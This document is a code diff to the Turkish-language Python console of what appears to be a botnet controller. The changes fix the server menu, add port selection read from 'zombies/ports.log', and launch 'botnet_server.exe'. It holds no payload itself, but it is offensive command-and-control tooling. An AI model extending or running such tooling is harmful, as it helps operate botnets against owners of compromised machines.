@@ -8,6 +8,12 @@ from PIL import *
 import shutil
 import sys
 import webbrowser
+try:
+    import termcolor
+except ImportError:
+    print('"termcolor" Bulunamadı! lütfen terminala "pip install termcolor" yaz!')
+    sys.exit()
+from termcolor import colored, cprint
 file = sys.argv[0]
 import os
 import signal
@@ -85,6 +91,7 @@ try:
 except:
     pass
 server = "Sunucu Yok"
+server_port = {}
 read_config.read(lang_file)
 available_langs = ["English", "Japanese", "Turkish"]
 lang_bool = []
@@ -191,24 +198,32 @@ try:
 except:
     pass
 num = 0
+other = 0
+copy = 0
 addr = {}
+current = ""
 if len(servers_list) > 1:
+    print('')
     print("SUNUCU SEÇİMi")
     print("--------------------------------")
     for s in servers_list:
+        if s == current:
+            continue
         num += 1
         print(f"{num}) SUNUCU --> {s} [{Fore.LIGHTRED_EX}OFFLINE{Fore.RESET}]")
+        current = s
         addr[num] = s
-    num += 1
+    other = num
+    other += 1
     print('-------------------------')
-    print(f"{num}) Atlamak...")
+    print(f"{other}) Atlamak...")
     print('')
     select = int(input(f"${Fore.LIGHTBLUE_EX}Sunucu seçin{Fore.RESET}~# "))
     if select in addr.keys():
         server = addr[num]
         print(Fore.BLUE+'[i]'+Fore.RESET+f' Sunucu başarıyla ayarlandı --> [{server}]')
         time.sleep(1)
-    elif select == num:
+    elif select == other:
         print(Fore.BLUE+'[i]'+Fore.RESET+' Sunucu seçimi atlandı...')
         server = "Sunucu Yok"
         time.sleep(0.3)
@@ -237,6 +252,63 @@ def exit_program():
         pass
     print(Fore.YELLOW+'[+]'+Fore.RESET+' Çıkılıyor...')
     sys.exit()
+selection_list = 0
+try:
+    with open(current_path+'/zombies/ports.log', 'r') as port_selection_server:
+        for line in port_selection_server:
+            if "\n" in line:
+                line = line.split("\n")
+                line = line[0]
+                use = line.split(":")
+                server_port[use[1]] = use[0]
+            else:
+                use = line.split(":")
+                server_port[use[1]] = use[0]
+except:
+    pass
+much = 0
+check = []
+for items in server_port.items():
+    if server in items:
+        for n in items:
+            if n == server:
+                check.append(n)
+                much += 1
+            else:
+                pass
+
+MANUAL = False
+ports = []
+selected_port = 0
+addr_port = {}
+current_port = 0
+if much > 1:
+    print(Fore.MAGENTA+'[!]'+Fore.RESET+" 1'den fazla bağlantı noktası bulduk, bu yüzden lütfen bir tane seçin")
+    check.clear()
+    for j in server_port.keys():
+        if server in server_port[j]:
+            ports.append(j)
+        else:
+            pass
+    MANUAL = True
+    print('')
+    cprint(f"{server} İçin Port seçimi", 'blue', attrs=['blink'])
+    print('---------------------------------')
+    for i in ports:
+        if current_port == i:
+            continue
+        selected_port += 1
+        print(f'{selected_port} - PORT {i}: "{server}"')
+        current_port = i
+        addr_port[selected_port] = i
+    print('-------------------------------------')
+    while True:
+        port_ = int(input(Fore.LIGHTBLUE_EX+f'~$"{Fore.RESET}{server}{Fore.LIGHTBLUE_EX}" İçin bağlantı noktası seçin: '+Fore.RESET))
+        if port_ in addr_port.keys():
+            load = ["0000", addr_port[port_]]
+            break
+        else:
+            print(Fore.RED+'[-]'+Fore.RESET+' Geçersiz bağlantı noktası girildi!')
 
 
 def choice_print():
@@ -349,11 +421,12 @@ print(Fore.LIGHTGREEN_EX+'[?]'+Fore.RESET+' Terminal pencere türünü temizleme
 if server == "Sunucu Yok" or server == "":
     pass
 else:
-    with open(current_path+'/zombies/ports.log') as port:
-        for line in port:
-            if server in line:
-                load = line.split(server+':')
-                break
+    if MANUAL == False:
+        with open(current_path+'/zombies/ports.log') as port:
+            for line in port:
+                if server in line:
+                    load = line.split(server+':')
+                    break
     print(Fore.BLUE+'[i]'+Fore.RESET+' Sunucu: "'+server+'" Yükleniyor... [Port: '+load[1]+']')
     os.system("start "+current_path+"/server/botnet_server.exe "+server+" "+load[1])
     print(Fore.BLUE+'[i]'+Fore.RESET+' Sunucu: "'+server+f'" bağlantıları alıyor! ({Fore.LIGHTGREEN_EX}online{Fore.RESET})')
@@ -696,7 +769,7 @@ while True:
                     with open(current_path+'/zombies/server.log', 'a') as srv:
                         srv.write(str(server_name)+'\n')
                     with open(current_path+'/zombies/ports.log', 'a') as prt:
-                        prt.write(server_name+':'+server_port)
+                        prt.write(server_name+':'+server_port+'\n')
                 except:
                     pass
                 print(Fore.YELLOW+'[+]'+Fore.RESET+' Başarıyla Sunucu Yazıldı: "'+str(server_name)+'"')
